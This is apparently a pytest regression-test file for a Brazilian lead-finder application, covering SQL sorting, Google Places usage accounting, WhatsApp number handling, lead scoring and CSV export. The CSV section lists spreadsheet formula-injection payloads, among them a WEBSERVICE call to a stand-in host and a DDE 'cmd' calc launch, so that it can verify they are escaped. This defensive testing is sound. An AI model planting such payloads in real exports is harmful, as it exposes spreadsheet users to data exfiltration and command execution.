"""Regressões dos 6 problemas P2 apontados pela revisão do Codex no PR #1 (e do caso irmão no Place Details).

Cada teste reproduz o cenário descrito na revisão e falhava no código anterior às correções.
"""
from __future__ import annotations

import csv
import sqlite3
import threading
import time

import pytest

from mobilia.modules.lead_finder.config import Secrets, Settings
from mobilia.modules.lead_finder.export import _safe, write_csv
from mobilia.modules.lead_finder.models import GeoScope, Lead, SearchQuery
from mobilia.modules.lead_finder.net import Cancelled, CancelToken, HttpClient
from mobilia.modules.lead_finder.scoring import score_lead
from mobilia.modules.lead_finder.search import run_search
from mobilia.modules.lead_finder.sources import build
from mobilia.modules.lead_finder.storage import MIGRATIONS, SCHEMA_VERSION, SORTABLE, Store

from .conftest import fixture_json, wait_until


def L(source="osm", ref="node/1", name="Imobiliária Alfa", **kw):
    base = dict(city="Campinas", uf="SP", category="Imobiliária")
    base.update(kw)
    return Lead(source=source, source_ref=ref, name=name, **base)


# ======================================================================= 1. ordenação SQL com vírgulas

@pytest.mark.parametrize("key", sorted(SORTABLE))
@pytest.mark.parametrize("desc", [True, False])
def test_every_sort_key_produces_valid_sql(store, key, desc):
    store.ingest([L(ref="node/1", name="A", phone="19 99900-0001"), L(ref="node/2", name="B", city="Santos")])
    rows, total = store.page(sort=key, desc=desc)                      # antes: OperationalError em priority/score
    assert total == 2 and len(rows) == 2


def test_priority_and_score_sort_order(store):
    store.ingest([L(ref=f"node/{i}", name=f"E{i}", city=f"C{i}") for i in range(4)])
    ids = {r["name"]: r["id"] for r in store.page()[0]}
    store.con.execute("UPDATE leads SET score=NULL, priority=0, priority_user=0 WHERE name='E0'")
    store.con.execute("UPDATE leads SET score=80, priority=3 WHERE name='E1'")
    store.con.execute("UPDATE leads SET score=20, priority=1, priority_user=2 WHERE name='E2'")
    store.con.execute("UPDATE leads SET score=50, priority=2 WHERE name='E3'")
    store.con.commit()
    assert [r["name"] for r in store.page(sort="score", desc=True)[0]] == ["E1", "E3", "E2", "E0"]   # NULL por último
    assert [r["name"] for r in store.page(sort="score", desc=False)[0]] == ["E0", "E2", "E3", "E1"]
    by_prio = [r["name"] for r in store.page(sort="priority", desc=True)[0]]
    assert by_prio[0] == "E1" and set(by_prio[1:3]) == {"E2", "E3"} and by_prio[3] == "E0"   # max(priority, user)
    assert ids


def test_sort_expressions_are_explicit_tuples():
    for key, exprs in SORTABLE.items():
        assert isinstance(exprs, tuple) and exprs, key


# ================================================================ 2. custo do Google ao cancelar

def _google(http, tmp_path, **kw):
    s = Settings(google_enabled=True, **kw)
    sec = Secrets(tmp_path, env={})
    sec.set("google_places", "AIzaFAKEKEY0000000000000")
    return build(http, s, sec, tmp_path), s


class Ctx(CancelToken):
    def __init__(self):
        super().__init__()
        self.items = []

    def emit(self, item):
        self.items.append(item)

    def progress(self, *a):
        pass


def test_cancel_during_paid_request_still_counts_usage(transport, tmp_path):
    ctx = Ctx()
    sent = threading.Event()

    def slow_reply(req):              # a requisição saiu; o usuário cancela enquanto ela está em andamento
        sent.set()
        ctx.cancel()
        time.sleep(0.4)
        return 200, fixture_json("google_textsearch.json")
    transport.add("POST", r"places\.googleapis\.com", slow_reply)
    http = HttpClient(transport=transport, sleeper=lambda s: None)
    srcs, _ = _google(http, tmp_path, google_price_per_1000_usd=35.0)
    query = SearchQuery(GeoScope("uf", ufs=["SP"]), ["Imobiliária", "Construtora"], ["google_places"])
    with pytest.raises(Cancelled):
        run_search(ctx, query, srcs)
    assert sent.is_set()
    usage = [i for i in ctx.items if i[0] == "usage"]
    assert usage == [("usage", "google_places", 1, pytest.approx(0.035))]      # antes: nenhum registro


def test_unexpected_error_still_counts_usage(transport, tmp_path):
    transport.add("POST", r"places\.googleapis\.com", RuntimeError("falha inesperada no transporte"))
    http = HttpClient(transport=transport, sleeper=lambda s: None)
    srcs, _ = _google(http, tmp_path)
    ctx = Ctx()
    with pytest.raises(RuntimeError):
        run_search(ctx, SearchQuery(GeoScope("uf", ufs=["SP"]), ["Imobiliária"], ["google_places"]), srcs)
    assert [i[2] for i in ctx.items if i[0] == "usage"] == [1]


def test_monthly_cap_holds_across_cancelled_searches(transport, tmp_path):
    """Com o uso do cancelamento registrado, a próxima pesquisa enxerga o limite certo."""
    store = Store(tmp_path / "leads.sqlite3")
    ctx = Ctx()
    transport.add("POST", r"places\.googleapis\.com",
                  lambda req: (ctx.cancel(), time.sleep(0.4), (200, {"places": []}))[2])
    http = HttpClient(transport=transport, sleeper=lambda s: None)
    srcs, s = _google(http, tmp_path, google_monthly_request_cap=1)
    q = SearchQuery(GeoScope("uf", ufs=["SP"]), ["Imobiliária"], ["google_places"])
    with pytest.raises(Cancelled):
        run_search(ctx, q, srcs)
    for _, sid, units, cost in [i for i in ctx.items if i[0] == "usage"]:
        store.record_usage(sid, units, cost)
    used = store.usage_month("google_places")[0]
    assert used == 1
    ctx2 = Ctx()
    summary = run_search(ctx2, q, srcs, google_used_month=used)
    assert len(transport.requests) == 1 and summary["google_places"]["paid"] == 0   # limite mensal respeitado
    store.close()


# ============================================================ 3. destinatário do WhatsApp em Mensagens

@pytest.fixture()
def page(qapp, tmp_path, transport, home):
    from PySide6.QtWidgets import QMainWindow

    from mobilia.modules.lead_finder.ui.page import LeadFinderPage
    from mobilia.ui.widgets import StatusBar
    win = QMainWindow(); win.setStatusBar(StatusBar())
    p = LeadFinderPage(win, base=tmp_path / "lf", http=HttpClient(transport=transport, sleeper=lambda s: None))
    win.setCentralWidget(p); win.show()
    p.opened = []
    p.ctx.open_url = p.opened.append
    yield p
    p.ctx.shutdown(); win.close(); win.deleteLater(); qapp.processEvents()


def db(page, fn, *args):
    return page.ctx.db.call(fn, *args).result(timeout=10)


def test_new_search_clears_previous_recipient(page, qapp):
    db(page, lambda s: s.ingest([L(ref="node/1", name="Alfa Única", phone="19 99900-0001"),
                                 L(ref="node/2", name="Beta Um", phone="19 99900-0002", city="Santos"),
                                 L(ref="node/3", name="Beta Dois", phone="19 99900-0003", city="Sorocaba")]))
    view = page.views["messages"]
    page.show_tab("messages")
    view.lead_search.setText("alfa"); view._find_leads()
    assert wait_until(qapp, lambda: view.lead is not None and view.lead["name"] == "Alfa Única")
    assert view.btn_wa.isEnabled() and view.company.text() == "Alfa Única"
    view.lead_search.setText("beta"); view._find_leads()                # vários resultados, nenhum escolhido
    assert wait_until(qapp, lambda: view.lead_combo.count() == 3)
    assert view.lead is None and not view.btn_wa.isEnabled()            # antes: continuava apontando para Alfa
    assert view.lead_combo.currentData() is None and view.company.text() == ""
    page.ctx.last_dialog = None
    view._open_wa(); wait_until(qapp, lambda: False, 0.3)
    assert page.ctx.last_dialog is None and page.opened == []
    view.lead_search.setText("inexistente"); view._find_leads()         # zero resultados
    assert wait_until(qapp, lambda: view.lead_combo.count() == 1)
    assert view.lead is None and not view.btn_wa.isEnabled()


def test_manual_company_name_is_kept_when_list_changes(page, qapp):
    db(page, lambda s: s.ingest([L(ref="node/1", name="Alfa Única", phone="19 99900-0001")]))
    view = page.views["messages"]
    view.company.setText("Nome digitado por mim")
    view.lead_search.setText("nada"); view._find_leads()
    assert wait_until(qapp, lambda: view.lead_combo.count() == 1)
    assert view.company.text() == "Nome digitado por mim"


def test_stale_lead_answer_is_ignored(page, qapp):
    db(page, lambda s: s.ingest([L(ref="node/1", name="Alfa", phone="19 99900-0001"),
                                 L(ref="node/2", name="Beta", phone="19 99900-0002", city="Santos")]))
    view = page.views["messages"]
    view.lead_search.setText(""); view._find_leads()
    assert wait_until(qapp, lambda: view.lead_combo.count() == 3)
    view.lead_combo.setCurrentIndex(1)                                   # pede Alfa ao banco...
    view.lead_combo.setCurrentIndex(0)                                   # ...e desiste antes da resposta
    wait_until(qapp, lambda: False, 0.4)
    assert view.lead is None and not view.btn_wa.isEnabled()


# =================================================================== 4. pontuação acompanha os dados

def test_score_updates_when_same_source_record_gains_data(store):
    """Cenário da revisão: só a categoria → 15; o mesmo registro com celular e site → o valor de score_lead."""
    store.ingest([L(ref="node/1", name="Alfa")])
    lid = store.page()[0][0]["id"]
    assert store.get(lid)["score"] == 15
    store.ingest([L(ref="node/1", name="Alfa", phone="19 99900-0001", website="https://alfa-exemplo.com.br")])
    d = store.get(lid)
    expected, prio, _ = score_lead(d)
    assert d["score"] == expected == 49 and d["priority"] == prio == 2  # antes: continuava 15


def test_score_updates_on_consolidation_whatsapp_and_purge(store):
    store.ingest([L(ref="node/1", name="Alfa", category="")])
    lid = store.page()[0][0]["id"]
    s0 = store.get(lid)["score"]
    store.ingest([L("cnpj_aberto", "11222333000181", "Alfa", category="Incorporadora", cnpj="11222333000181",
                    situacao="ATIVA", phone="19 3200-0001")])            # consolidada por nome + cidade
    s1 = store.get(lid)["score"]
    assert s1 > s0 and s1 == score_lead(store.get(lid))[0]
    store.set_whatsapp(lid, "confirmado")
    s2 = store.get(lid)["score"]
    assert s2 > s1
    store.ingest([L("google_places", "ChIJX", "Só Google", phone="+55 21 99999-0002", website="https://g.com.br",
                    city="Rio", uf="RJ")])
    gid = [r["id"] for r in store.page()[0] if r["name"] == "Só Google"][0]
    before = store.get(gid)["score"]
    store.con.execute("UPDATE lead_sources SET expires_at='2000-01-01T00:00:00+00:00' WHERE source='google_places'")
    store.con.commit()
    store.purge_expired()
    assert store.get(gid)["score"] < before                             # dados apagados → pontuação cai


def test_dashboard_qualified_count_reflects_new_data(store):
    store.ingest([L(ref="node/1", name="Alfa")])
    assert store.dashboard(40)["values"]["qualified"] == 0
    store.ingest([L(ref="node/1", name="Alfa", phone="19 99900-0001", website="https://alfa-exemplo.com.br")])
    assert store.dashboard(40)["values"]["qualified"] == 1


# ===================================================================== 5. fórmulas em CSV

@pytest.mark.parametrize("value", [
    "=1+1", '=1+WEBSERVICE("https://example.invalid/"&A2)', "+1+1", "-1+cmd|' /C calc'!A0", "@SUM(1+1)",
    "\t=1+1", "\r=1+1", "  =1+1", "=HYPERLINK(\"http://mal\")", "+5511987654321 abc",
])
def test_formula_prefixed_values_are_escaped(value):
    assert _safe(value) == "'" + value


@pytest.mark.parametrize("value", ["-12", "+3", "3,5", "-0.25", "Imobiliária Alfa", "(19) 3200-0001", "", "10"])
def test_plain_values_are_untouched(value):
    assert _safe(value) == value


def test_exported_company_name_with_formula_is_neutralized(store, tmp_path):
    store.ingest([L(name='=1+WEBSERVICE("https://example.invalid/"&A2)', phone="19 3200-0001")])
    rows, attributions, _ = store.export_rows()
    out = write_csv(tmp_path / "x.csv", rows, Store.EXPORT_COLUMNS, attributions)
    cells = list(csv.reader(out.read_text(encoding="utf-8-sig").splitlines(), delimiter=";"))[1]
    assert cells[0].startswith("'=1+WEBSERVICE")


# ============================================================ 6. número confirmado como WhatsApp

def test_manual_confirmation_keeps_the_mobile_candidate(store):
    """Cenário da revisão: fixo em phone e celular em phone2; confirmar não pode trocar para o fixo."""
    store.ingest([L(phone="19 3200-0001", phone2="19 99900-0001")])
    lid = store.page()[0][0]["id"]
    assert store.get(lid)["wa_number"] == "+5519999000001"
    store.set_whatsapp(lid, "confirmado")
    d = store.get(lid)
    assert (d["wa_number"], d["wa_status"]) == ("+5519999000001", "confirmado")   # antes: +551932000001
    store.ingest([L(phone="19 3200-0001", phone2="19 99900-0001", address="Rua Nova")])   # nova consulta
    assert store.get(lid)["wa_number"] == "+5519999000001"


def test_user_can_confirm_a_specific_number(store):
    store.ingest([L(phone="19 3200-0001", phone2="19 99900-0001")])
    lid = store.page()[0][0]["id"]
    assert store.whatsapp_candidates(lid) == ["+5519999000001", "+551932000001"]
    store.set_whatsapp(lid, "confirmado", "(19) 3200-0001")             # WhatsApp Business no fixo
    assert store.get(lid)["wa_number"] == "+551932000001"
    with pytest.raises(ValueError):
        store.set_whatsapp(lid, "confirmado", "11 98888-7777")          # número que não é da empresa
    with pytest.raises(ValueError):
        store.set_whatsapp(lid, "confirmado", "abc")
    store.set_whatsapp(lid, "")                                          # desfazer: volta ao automático
    assert (store.get(lid)["wa_number"], store.get(lid)["wa_status"]) == ("+5519999000001", "provavel")


def test_confirmed_number_beats_other_source_whatsapp(store):
    store.ingest([L(phone="19 3200-0001", whatsapp="19 99900-0009")])
    lid = store.page()[0][0]["id"]
    store.set_whatsapp(lid, "confirmado", "19 3200-0001")
    assert store.get(lid)["wa_number"] == "+551932000001"


def test_confirm_without_valid_phone_is_refused(store):
    store.ingest([L(phone="0800 123 4567")])
    lid = store.page()[0][0]["id"]
    with pytest.raises(ValueError):
        store.set_whatsapp(lid, "confirmado")


def test_migration_v3_keeps_previous_confirmation(tmp_path):
    path = tmp_path / "v2.sqlite3"
    con = sqlite3.connect(path)
    for m in MIGRATIONS[:2]:
        con.executescript(m)
    con.execute("PRAGMA user_version=2")
    con.execute("INSERT INTO leads(name, wa_user, wa_number, created_at) VALUES ('X', 'confirmado', '+5519999000001', '')")
    con.commit(); con.close()
    s = Store(path)
    assert s.version == SCHEMA_VERSION == 3
    assert s.con.execute("SELECT wa_user_number FROM leads").fetchone()[0] == "+5519999000001"
    s.close()


def test_detail_panel_asks_which_number(page, qapp, monkeypatch):
    from PySide6.QtWidgets import QInputDialog
    db(page, lambda s: s.ingest([L(phone="19 3200-0001", phone2="19 99900-0001")]))
    lid = db(page, lambda s: s.page()[0][0]["id"])
    asked = {}

    def pick(parent, title, label, items, current, editable):
        asked["items"] = items
        return items[1], True                                            # escolhe o fixo
    monkeypatch.setattr(QInputDialog, "getItem", staticmethod(pick))
    page._open_lead(lid)
    detail = page.views["leads"].detail
    assert wait_until(qapp, lambda: detail.lead is not None and detail.lead["id"] == lid)
    detail.wa_state.setCurrentIndex(detail.wa_state.findData("confirmado"))
    assert wait_until(qapp, lambda: db(page, lambda s: s.get(lid))["wa_status"] == "confirmado")
    assert asked["items"][0].startswith("(19) 99900-0001") and "(atual)" in asked["items"][0]
    assert db(page, lambda s: s.get(lid))["wa_number"] == "+551932000001"


# ==================================================== extra: Place Details também conta uso e respeita limite

def test_google_refresh_counts_each_request_even_on_error(page, qapp, transport, no_modal):
    page.ctx.settings.google_enabled = True
    page.ctx.secrets.set("google_places", "AIzaFAKEKEY0000000000000")
    transport.add("GET", r"places\.googleapis\.com/v1/places/", (403, {"error": {"message": "negado"}}))
    db(page, lambda s: s.ingest([L("google_places", "ChIJTESTE0000001", "Alfa", phone="19 99900-0001")]))
    lid = db(page, lambda s: s.page()[0][0]["id"])
    view = page.views["leads"]
    view.refresh_google(lid)
    assert wait_until(qapp, lambda: view.bg_task is not None and view.bg_task.finished.is_set())
    assert wait_until(qapp, lambda: db(page, lambda s: s.usage_month("google_places")[0]) == 1)  # antes: 0


def test_google_refresh_respects_monthly_cap(page, qapp, transport, no_modal):
    page.ctx.settings.google_enabled = True
    page.ctx.settings.google_monthly_request_cap = 3
    page.ctx.secrets.set("google_places", "AIzaFAKEKEY0000000000000")
    db(page, lambda s: (s.record_usage("google_places", 3, 0.1),
                        s.ingest([L("google_places", "ChIJTESTE0000001", "Alfa", phone="19 99900-0001")])))
    lid = db(page, lambda s: s.page()[0][0]["id"])
    view = page.views["leads"]
    view.refresh_google(lid)
    wait_until(qapp, lambda: False, 0.4)
    assert transport.requests == [] and view.bg_task is None
